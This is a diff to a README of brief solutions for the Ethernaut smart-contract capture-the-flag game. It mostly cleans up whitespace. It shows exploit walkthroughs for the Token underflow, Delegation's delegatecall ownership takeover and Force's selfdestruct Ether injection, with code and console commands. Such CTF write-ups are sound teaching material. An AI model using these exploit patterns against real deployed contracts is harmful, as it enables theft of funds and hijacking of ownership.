@@ -2,19 +2,18 @@
 
 _The Ethernaut is a Web3/Solidity based wargame inspired by [overthewire.org](https://overthewire.org/wargames/), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. The game is 100% open source and all levels are contributions made by other players._
 
-Brief solutions to OpenZeppelin's Ethernaut CTF. 
+Brief solutions to OpenZeppelin's Ethernaut CTF.
 
 **Completed**
 
 [Level 0: Hello Ethernaut](#HelloEthernaut)  
 [Level 1: Fallback](#Fallback)  
-[Level 2: Fallout](#Fallout)    
-[Level 3: Coin Flip](#CoinFlip)   
-[Level 4: Telephone](#Telephone)   
+[Level 2: Fallout](#Fallout)  
+[Level 3: Coin Flip](#CoinFlip)  
+[Level 4: Telephone](#Telephone)  
 [Level 5: Token](#Token)  
 [Level 6: Delegation](#Delegation)  
 [Level 7: Force](#Force)
-
 
 <!---
 
@@ -160,13 +159,14 @@ Let's replicate the remaining essential aspects of the `flip()` function. This c
     uint256 coinFlip = blockValue.div(FACTOR);
     bool side = coinFlip == 1 ? true : false;
 ```
+
 Finally, we will pass the side value into the original contract, ensuring our guess is always correct. This completes our final objective.
 
 ```solidity
 targetContract.flip(side);
 ```
-We patiently call `flipSolve()` 10 times until we have guessed correctly 10 times and solve the level.
 
+We patiently call `flipSolve()` 10 times until we have guessed correctly 10 times and solve the level.
 
 ## <a name='Telephone'></a> 4. Telephone
 
@@ -197,19 +197,17 @@ contract HotlineBling {
 }
 ```
 
-
 ## <a name='Token'></a> 5. Token
 
 > The goal of this level is to hack the basic token contract and extract additional tokens -- preferably a very large amount of tokens.
 
 The odometer hint reminds us of the possibility for [underflow and overflow](https://docs.soliditylang.org/en/v0.5.11/security-considerations.html#two-s-complement-underflows-overflows).
-We will trigger an underflow by transferring more tokens than available. Since we are using `uint`, instead of creating a negative balance, the result will be a large positive integer. 
+We will trigger an underflow by transferring more tokens than available. Since we are using `uint`, instead of creating a negative balance, the result will be a large positive integer.
 
 We will use the `transfer()` function for this exploit, which requires two inputs: destination address and value to send. We'll use an arbitrary address (the ethernaut address) and we'll send 1 token more than we were provided (20+1).
 
-
 ```solidity
-// Retrieve the ethernaut address 
+// Retrieve the ethernaut address
 > await ethernaut.address
 < 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
 
@@ -217,38 +215,38 @@ We will use the `transfer()` function for this exploit, which requires two input
 > await contract.balanceOf("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33") // expanding reveals the balance is 0
 
 //Verify our own address balance
-> await contract.balanceOf(player) // expanding reveals the balance is 20, as expected 
+> await contract.balanceOf(player) // expanding reveals the balance is 20, as expected
 
-// Execute the exploit, transferring 21 tokens (triggering the overlow) to the ethernaut address 
+// Execute the exploit, transferring 21 tokens (triggering the overlow) to the ethernaut address
 // (we could also transfer to any valid address)
 > contract.transfer("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33", 21)
 
-// After the transaction is confirmed, check the ethernaut balance 
-> await contract.balanceOf("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33")  // the balance is 21, as expected 
+// After the transaction is confirmed, check the ethernaut balance
+> await contract.balanceOf("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33")  // the balance is 21, as expected
 
 // Verify our updated address balance
 > await contract.balanceOf(player) // revealing Array(11) -- a balance that is "a very large amount of tokens"
 ```
 
-Fortunately, the Solidity compiler now rejects code resulting in an underflow or overflow, as of v0.8.0. For contracts with previous compiler versions -- like this one -- [OpenZeppelin's SafeMath library](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath) is suggested. 
+Fortunately, the Solidity compiler now rejects code resulting in an underflow or overflow, as of v0.8.0. For contracts with previous compiler versions -- like this one -- [OpenZeppelin's SafeMath library](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath) is suggested.
 
 ## <a name='Delegation'></a> 6. Delegation
 
 > The goal of this level is to claim ownership of the instance you are given.
 
-Essentially, `delegatecall` allows a calling contract to use the functions of another contract while preserving its context (i.e., `address(this)`, `msg.sender`, `msg.value`). Additionally, the calling contract will execute on its own storage and state variables. 
+Essentially, `delegatecall` allows a calling contract to use the functions of another contract while preserving its context (i.e., `address(this)`, `msg.sender`, `msg.value`). Additionally, the calling contract will execute on its own storage and state variables.
 
-Our goal -- claiming ownership -- can be achieved by executing the `pwn()` function of the `Delegate` contract, which will sets `owner` equal to `msg.sender`. If we execute `pwn()` as a `delegatecall` from the `Delegation`  instance, we can claim ownership (due to `msg.sender` being preserved from the calling `Delegation` contract). 
+Our goal -- claiming ownership -- can be achieved by executing the `pwn()` function of the `Delegate` contract, which will sets `owner` equal to `msg.sender`. If we execute `pwn()` as a `delegatecall` from the `Delegation` instance, we can claim ownership (due to `msg.sender` being preserved from the calling `Delegation` contract).
 
-Fortunately, both the `Delegation` and `Delegate` contracts  designate slot 0 for `owner`, which will ensure we can easily update ownership. To pull off the change of ownership, we'll call the `fallback()` function and specify `msg.data` as the `pwn()` function. 
+Fortunately, both the `Delegation` and `Delegate` contracts designate slot 0 for `owner`, which will ensure we can easily update ownership. To pull off the change of ownership, we'll call the `fallback()` function and specify `msg.data` as the `pwn()` function.
 
-Before we specify `msg.data`, the level hints reminds us about method ID. We recall that we can create Method IDs to call a function, as noted [here](https://ethereum.stackexchange.com/questions/78179/how-to-create-function-selector-method-ids). So, to specify `msg.data` as the `pwn()` function, we will pass the first four bytes of the Keccak-256 hash (according to the [ABI specs](http://solidity.readthedocs.io/en/latest/abi-spec.html#function-selector)). 
+Before we specify `msg.data`, the level hints reminds us about method ID. We recall that we can create Method IDs to call a function, as noted [here](https://ethereum.stackexchange.com/questions/78179/how-to-create-function-selector-method-ids). So, to specify `msg.data` as the `pwn()` function, we will pass the first four bytes of the Keccak-256 hash (according to the [ABI specs](http://solidity.readthedocs.io/en/latest/abi-spec.html#function-selector)).
 
-Let’s create a variable to hold the `msg.data` information. The `web3.eth.abi` functions allow us to encode and decode parameters to ABI for function calls to the EVM -- as stated in the [Web3.js documentation](https://web3js.readthedocs.io/en/v1.2.11/web3.html). The `encodeFunctionSignature` function encodes the function name to its ABI signature, which are the first 4 bytes of the hash of the function name. 
+Let’s create a variable to hold the `msg.data` information. The `web3.eth.abi` functions allow us to encode and decode parameters to ABI for function calls to the EVM -- as stated in the [Web3.js documentation](https://web3js.readthedocs.io/en/v1.2.11/web3.html). The `encodeFunctionSignature` function encodes the function name to its ABI signature, which are the first 4 bytes of the hash of the function name.
 
- `let msgdata = web3.eth.abi.encodeFunctionSignature("pwn()”)`.
+`let msgdata = web3.eth.abi.encodeFunctionSignature("pwn()”)`.
 
-To trigger the `fallback()` function, we’ll use `sendTransaction()` and specify the `from`, `to`, and `data` parameters. 
+To trigger the `fallback()` function, we’ll use `sendTransaction()` and specify the `from`, `to`, and `data` parameters.
 
 `contract.sendTransaction({from: player, to:instance, data: msgdata})`
 
@@ -265,18 +263,16 @@ Let’s put this together and execute the transfer of ownership.
 // Trigger the fallback function, with our specified `msg.data` to call the `pwn()` function
 contract.sendTransaction({from:player, to:instance, data:msgdata})
 
-// Verify we have claimed ownership of the contract instance 
+// Verify we have claimed ownership of the contract instance
 > await contract.owner()
 < 0x... // reflects the player address
 ```
-
-
 
 ## <a name='Force'></a> 7. Force
 
 > The goal of this level is to make the balance of the contract greater than zero.
 
-The level gives us a simple contract, without any functions. However, we do get an adorable kitten. 
+The level gives us a simple contract, without any functions. However, we do get an adorable kitten.
 
 ```solidity
 /*
@@ -292,54 +288,54 @@ Typically, we would rely on a provided function to transfer value to the contrac
 
 Within the [Security Considerations](https://docs.soliditylang.org/en/develop/security-considerations.html#sending-and-receiving-ether) section of the Solidity documentation, we learn that we can actually move Ether without message calls! We can designate a target address as the recipient for either (a) mining block rewards or (b) remaining value of a self-destructed contract. The latter seems more feasible.
 
-Let’s force Ether into our instance by (1) creating a contract, (2) providing the contract with a balance, and (3) have it `selfdestruct`, with the recipient as our instance. 
+Let’s force Ether into our instance by (1) creating a contract, (2) providing the contract with a balance, and (3) have it `selfdestruct`, with the recipient as our instance.
 
-  (1) First, we'll create, compile, and deploy the following contract in Remix.
+(1) First, we'll create, compile, and deploy the following contract in Remix.
 
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
- 
- // create new contract 
- contract ForceFeedEther {
- 
-// allow receipt of ether
-   
-   receive () external payable {
-   }
 
-// force ether into target contract 
-function boomBoomPow(address payable _targetAddr) public {
-   selfdestruct(_targetAddr);
-}
+// create new contract
+contract ForceFeedEther {
+    // allow receipt of ether
+
+    receive() external payable {}
+
+    // force ether into target contract
+    function boomBoomPow(address payable _targetAddr) public {
+        selfdestruct(_targetAddr);
+    }
 }
 ```
-(2) Now, we'll provide the contract with a balance. We've included a `receive` function to assist with this.
+
+(2) Now, we'll provide the contract with a balance. We've included a `receive` function in our contract to assist with this.
 
 ```js
-// Let's check that our contract value is currently 0
+// Let's check that our contract value is currently 0 from the console
 > toWei(await getBalance('0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55'))
-< '0' 
+< '0'
 
 // Send 10 Ether to contract
 > await web3.eth.sendTransaction({to:'0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55', from:player, value:10})
 
 // Check updated contract value
 > toWei(await getBalance('0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55'))
-< '10' 
+< '10'
 ```
 
-(3) Finally, we'll have the contract `selfdestruct`, with the recipient as our instance. 
+(3) Finally, we'll have the contract `selfdestruct`, with the recipient as our instance.
 
 ```js
-// Confirm the instance value is 0
+// Confirm the instance value is 0 from the console
 > toWei(await getBalance(instance))
-< '0' 
+< '0'
 
 // Execute selfdestruct from Remix, specifying the instance address as the target address
 
 // Check the updated instance value
 > toWei(await getBalance(instance))
-< '10' 
+< '10'
 ```
+
 Submit instance for completion.
